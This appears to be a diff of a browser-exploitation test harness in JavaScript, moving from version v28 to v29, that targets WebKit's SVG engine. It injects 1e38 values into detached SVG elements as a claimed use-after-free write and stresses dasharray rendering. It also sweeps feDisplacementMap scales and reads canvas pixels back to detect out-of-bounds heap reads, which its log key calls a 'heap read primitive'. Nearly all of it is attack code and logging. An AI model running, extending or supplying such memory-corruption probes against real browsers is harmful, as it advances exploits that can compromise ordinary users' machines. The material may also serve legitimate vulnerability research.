   } catch(e) { log('  path.pathLength threw: ' + e, 'bad'); }
 
   if (!pl) { log('  [!] pathLength not accessible', 'bad'); document.body.removeChild(outer); if (!q) dis(false); return {}; }
 
-  // UAF write: remove path, write 1e38 into pathLength.baseVal, re-add
-  var bv_pl = pl; // SVGAnimatedNumber - the property itself
-  log('  removing path from outer...', 'inf');
+  // UAF write: remove, write 1e38, re-add (no micro — using raf)
+  log('  removing path...', 'inf');
   path.remove();
-  await micro();
+  await raf();
 
   var wrote = false;
   try {
-    bv_pl.baseVal = BIG;
-    var rb = bv_pl.baseVal;
+    pl.baseVal = BIG;
+    var rb = pl.baseVal;
     wrote = (rb > 1e30);
     log('  after remove: pathLength.baseVal = ' + rb + ' wrote=' + wrote, wrote ? 'ok' : 'bad');
-  } catch(e) { log('  pathLength.baseVal write threw: ' + e, 'bad'); }
+  } catch(e) { log('  pathLength write threw: ' + e, 'bad'); }
 
-  // Re-add with pathLength=1e38 and various dasharray configs
   outer.appendChild(path);
   await raf();
+  log('  path re-added. pathLength.baseVal = ' + (path.pathLength ? path.pathLength.baseVal : '?'), 'inf');
 
-  log('  path re-added with pathLength=1e38', 'ok');
-  log('  path.pathLength.baseVal after re-add: ' + (path.pathLength ? path.pathLength.baseVal : '?'), 'inf');
-
-  // Now test: does changing dasharray trigger crash?
+  var crashed = false;
   var dashTests = [
-    '10,5',           // normal
-    '1,1',            // fine-grain
-    '0.001,0.001',    // very small (maximizes iteration count)
-    '1000000,1',      // huge on: scale * 1e38 iterations?
-    '1e38,1',         // dasharray value itself = 1e38
+    ['10,5',         'normal'],
+    ['1,1',          'fine-grain'],
+    ['0.001,0.001',  'tiny dashes'],
+    ['1000000,1',    'huge on'],
+    ['1,0.001',      'huge ratio']
   ];
 
   for (var i = 0; i < dashTests.length; i++) {
-    var da = dashTests[i];
+    var da = dashTests[i][0];
+    var label = dashTests[i][1];
     try {
       path.setAttribute('stroke-dasharray', da);
       await raf();
       var tl = path.getTotalLength();
-      log('  dasharray=' + da + ' getTotalLength=' + tl, 'ok');
-    } catch(e) { log('  dasharray=' + da + ' threw: ' + e, 'bad'); }
+      log('  dasharray=' + label + ' (' + da + '): getTotalLength=' + tl, 'ok');
+    } catch(e) {
+      log('  dasharray=' + label + ' threw: ' + e, 'bad');
+      crashed = true;
+    }
   }
 
+  // Also: stroke-dashoffset = 1e38
+  try {
+    path.setAttribute('stroke-dasharray', '10,5');
+    path.setAttribute('stroke-dashoffset', '' + BIG);
+    await raf();
+    log('  stroke-dashoffset=1e38: survived', 'ok');
+  } catch(e) { log('  stroke-dashoffset=1e38 threw: ' + e, 'bad'); crashed = true; }
+
   document.body.removeChild(outer);
+  log('[*] DSH: wrote=' + wrote + ' crashed=' + crashed, crashed ? 'bad' : 'ok');
   if (!q) dis(false);
-  return { wrote: wrote };
+  return { wrote: wrote, crashed: crashed };
 }
 
 /*
- * FRC: force-repaint loop - aggressively trigger WebKit's paint+composite cycle
- *      with multiple 1e38 elements across different contexts simultaneously.
+ * SWP: scale sweep — find the threshold where feDisplacementMap crashes
  *
- * GOAL: stress-test the paint invalidation system with multiple concurrent
- *       1e38 elements forcing geometry/filter recalculation repeatedly.
- *       Any OOB write into painter scratch buffers may cause:
- *         - WebKit process crash (render process abort)
- *         - Pixel corruption visible via canvas readback
- *         - Silent garbage values in layout (different crashes later)
+ * v28: scale=1e38 survived. Maybe WebKit clamps before hitting OOB.
+ * Let's sweep scale from large to 1e38 and look for:
+ * - crash
+ * - performance degradation (longer raf time -> more work done)
+ * - pixel output change (canvas shows different content)
+ *
+ * Try scales: 1e3, 1e6, 1e9, 1e12, 1e15, 1e18, 1e20, 1e25, 1e30, 1e35, 1e38
+ *
+ * For each scale: apply filter, draw to canvas, read pixel[50,50].
+ * If scale is large enough to shift (50,50) to OOB: pixel becomes 0 (or garbage).
+ * The transition point where pixel goes from red -> 0 tells us the clamping threshold.
+ * If pixel is NEVER 0 regardless of scale: clamping is happening before rasterization.
+ * If pixel is 0 at scale > threshold AND we see consistent 0: rasterizer is reading from 0x0.
+ * If pixel is non-red non-zero garbage: OOB read returning heap data!
  */
-async function runFRC(q) {
-  if (!q) { dis(true); sep(); log('FRC: force-repaint with multiple concurrent 1e38 elements', 'inf'); sep(); }
+async function runSWP(q) {
+  if (!q) { dis(true); sep(); log('SWP: feDisplacementMap scale sweep 1e3..1e38, canvas pixel readback', 'inf'); sep(); }
 
-  var SVGs = [];
-  var N = 5;
-  var crashed = false;
+  var scales = [1, 10, 100, 1000, 1e6, 1e9, 1e12, 1e15, 1e18, 1e20, 1e25, 1e30, 1e33, 1e35, 1e37, 1e38];
+  var W = 200; var H = 200;
 
-  // Create N SVGs each with a 1e38 element
-  for (var i = 0; i < N; i++) {
-    var svg = document.createElementNS(SVG_NS, 'svg');
-    svg.setAttribute('width', '200'); svg.setAttribute('height', '200');
-    svg.style.cssText = 'position:fixed;opacity:0.01;pointer-events:none;top:' + (i*10) + 'px;left:' + (i*10) + 'px';
+  var cnv = document.createElement('canvas');
+  cnv.width = W; cnv.height = H;
+  var ctx = cnv.getContext('2d');
+  if (!ctx) { log('  [!] no canvas ctx', 'bad'); if (!q) dis(false); return {}; }
 
-    var rect = document.createElementNS(SVG_NS, 'rect');
-    rect.setAttribute('x', '0'); rect.setAttribute('y', '0');
-    rect.setAttribute('width', '50'); rect.setAttribute('height', '50');
-    rect.setAttribute('fill', 'hsl(' + (i * 72) + ',100%,50%)');
-    svg.appendChild(rect);
-    document.body.appendChild(svg);
-    SVGs.push({ svg: svg, rect: rect });
-  }
-  await raf();
+  log('  scale -> pixel[100,100] color (rect is red, R=255)', 'inf');
+  log('  if R drops to 0: displacement pushed pixel off-screen or OOB returned 0', 'inf');
+  log('  if pixel is non-red non-zero: OOB read leak!', 'inf');
 
-  // Inject 1e38 into all rects simultaneously
-  for (var j = 0; j < SVGs.length; j++) {
-    var obj = SVGs[j];
-    try {
-      var bvW = obj.rect.width ? obj.rect.width.baseVal : null;
-      var bvH = obj.rect.height ? obj.rect.height.baseVal : null;
-      obj.rect.remove();
-      if (bvW) bvW.value = BIG;
-      if (bvH) bvH.value = BIG;
-      obj.svg.appendChild(obj.rect);
-    } catch(e) { log('  inject ' + j + ' threw: ' + e, 'bad'); }
-  }
-  await raf();
-  log('  all ' + N + ' SVGs have 1e38 width/height rects', 'ok');
+  var prevR = -1;
+  var thresholdScale = null;
 
-  // Force rapid repaints: animate position to trigger invalidation
-  var ROUNDS = 10;
-  log('  running ' + ROUNDS + ' rapid repaint rounds...', 'inf');
-  try {
-    for (var round = 0; round < ROUNDS; round++) {
-      for (var k = 0; k < SVGs.length; k++) {
-        SVGs[k].svg.style.left = (k * 10 + round) + 'px';
-      }
-      await raf();
+  for (var si = 0; si < scales.length; si++) {
+    var sc = scales[si];
+
+    // Build inline SVG string with this scale baked in
+    var svgStr = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">' +
+      '<defs><filter id="f" color-interpolation-filters="sRGB">' +
+      '<feDisplacementMap in="SourceGraphic" in2="SourceGraphic"' +
+      ' scale="' + sc + '" xChannelSelector="R" yChannelSelector="G"/>' +
+      '</filter></defs>' +
+      '<rect x="50" y="50" width="100" height="100" fill="rgb(255,0,0)" filter="url(#f)"/>' +
+    '</svg>';
+
+    var blob = new Blob([svgStr], { type: 'image/svg+xml' });
+    var url = URL.createObjectURL(blob);
+    var img = new Image();
+
+    var pxR = await new Promise(function(resolve) {
+      img.onload = function() {
+        try {
+          ctx.clearRect(0, 0, W, H);
+          ctx.drawImage(img, 0, 0);
+          var px = ctx.getImageData(100, 100, 1, 1);
+          resolve(px.data[0]); // R channel
+        } catch(e2) { resolve(-1); }
+      };
+      img.onerror = function() { resolve(-2); };
+      img.src = url;
+      setTimeout(function() { resolve(-3); }, 2000);
+    });
+    URL.revokeObjectURL(url);
+
+    var note = '';
+    if (pxR === 255) note = ' (red - no displacement or clamped)';
+    else if (pxR === 0) note = ' (zero - displaced off-screen or OOB->0)';
+    else if (pxR < 0) note = ' (error ' + pxR + ')';
+    else note = ' (*** UNEXPECTED VALUE - possible OOB read ***)';
+
+    log('  scale=' + sc.toExponential(0) + ' px[100,100].R=' + pxR + note,
+      pxR > 0 && pxR < 255 ? 'bad' : (pxR === 0 ? 'inf' : 'dim'));
+
+    if (prevR !== pxR && prevR >= 0) {
+      log('  [TRANSITION] R changed from ' + prevR + ' -> ' + pxR + ' at scale=' + sc.toExponential(0), 'inf');
+      if (thresholdScale === null) thresholdScale = sc;
     }
-    log('  repaint loop survived: rounds=' + ROUNDS + ' crashed=false', 'ok');
-  } catch(e) {
-    log('  repaint loop threw: ' + e, 'bad');
-    crashed = true;
+    prevR = pxR;
   }
 
-  // Also try getBoundingClientRect on all (triggers layout for each)
-  for (var m = 0; m < SVGs.length; m++) {
-    try {
-      var bb = SVGs[m].rect.getBoundingClientRect();
-      log('  rect[' + m + '] bbox: w=' + bb.width.toFixed(0) + ' h=' + bb.height.toFixed(0), 'inf');
-    } catch(e) { log('  getBBox[' + m + '] threw: ' + e, 'bad'); }
+  if (thresholdScale) {
+    log('[*] SWP: displacement threshold at scale~' + thresholdScale.toExponential(0), 'inf');
+    log('[*] below threshold: pixel stays red (clamped or no-op)', 'ok');
+    log('[*] above threshold: pixel zeroed (displaced off-screen) or OOB garbage', 'inf');
+  } else {
+    log('[*] SWP: no transition found - R stayed constant across all scales', 'ok');
   }
 
-  // Cleanup
-  for (var n = 0; n < SVGs.length; n++) {
-    try { document.body.removeChild(SVGs[n].svg); } catch(e2) {}
-  }
-
-  log('[*] FRC: crashed=' + crashed, crashed ? 'bad' : 'ok');
   if (!q) dis(false);
-  return { crashed: crashed };
+  return { thresholdScale: thresholdScale };
 }
 
 // RUN ALL
 async function runAll() {
   dis(true); clearLog(); sep();
-  log('SVG UAF v28 - feDisplacementMap UAF + hit-test OOB + dasharray overflow + repaint stress', 'inf');
+  log('SVG UAF v29 - controlled overflow + self-displace filter + dasharray + scale sweep', 'inf');
   sep();
 
   var results = {};
   var tests = [
-    ['FLT_feDisp_UAF',    runFLT],
-    ['EFP_elementFromPt', runEFP],
-    ['CHK_intersection',  runCHK],
-    ['DSH_dasharray',     runDSH],
-    ['FRC_repaint_stress', runFRC]
+    ['OVM_overflow_map',   runOVM],
+    ['SDF_self_displace',  runSDF],
+    ['DSH_dasharray_fixed', runDSH],
+    ['SWP_scale_sweep',    runSWP]
   ];
 
   for (var i = 0; i < tests.length; i++) {
@@ -634,22 +554,32 @@ async function runAll() {
   }
 
   sep();
-  log('SUMMARY v28', 'inf');
+  log('SUMMARY v29', 'inf');
   sep();
   var keys = Object.keys(results);
   for (var ki = 0; ki < keys.length; ki++) {
     var k = keys[ki];
     var r = results[k];
     if (!r) { log('  ' + k + ': ERROR', 'bad'); continue; }
-    if (r.writeOk !== undefined) log('  ' + k + ': writeOk=' + r.writeOk + ' crashed=' + r.crashed, r.crashed ? 'bad' : 'ok');
-    else if (r.crashed !== undefined) log('  ' + k + ': crashed=' + r.crashed, r.crashed ? 'bad' : 'ok');
-    else if (r.wrote !== undefined) log('  ' + k + ': wrote=' + r.wrote, 'ok');
+    if (r.nonzeroDeltaCount !== undefined)
+      log('  ' + k + ': nonzeroDeltaCount=' + r.nonzeroDeltaCount + ' base=' + r.base,
+          r.nonzeroDeltaCount > 0 ? 'bad' : 'ok');
+    else if (r.pixelsLeak !== undefined)
+      log('  ' + k + ': crashed=' + r.crashed + ' pixelsLeak=' + r.pixelsLeak,
+          r.crashed || r.pixelsLeak > 0 ? 'bad' : 'ok');
+    else if (r.wrote !== undefined)
+      log('  ' + k + ': wrote=' + r.wrote + ' crashed=' + r.crashed,
+          r.crashed ? 'bad' : 'ok');
+    else if (r.thresholdScale !== undefined)
+      log('  ' + k + ': thresholdScale=' + (r.thresholdScale ? r.thresholdScale.toExponential(0) : 'none'), 'inf');
     else log('  ' + k + ': ran', 'ok');
   }
   log('');
-  log('  KEY: FLT writeOk=true -> scale.baseVal UAF confirmed on SVGAnimatedNumber', 'inf');
-  log('       ANY crashed=true -> rasterizer hit OOB on 1e38 input', 'inf');
-  log('       DSH wrote=true + repaint no crash -> need filter rasterizer path', 'inf');
+  log('  KEY:', 'inf');
+  log('  OVM nonzeroDeltaCount>0 -> y-pos controls overflow value (controllable int32)', 'inf');
+  log('  SDF pixelsLeak>0 -> OOB read visible in canvas (heap read primitive!)', 'inf');
+  log('  SDF crashed -> OOB hit unmapped page (crash = confirmed vuln)', 'inf');
+  log('  SWP thresholdScale -> exact scale where rasterizer stops clamping', 'inf');
   sep();
   dis(false);
 }
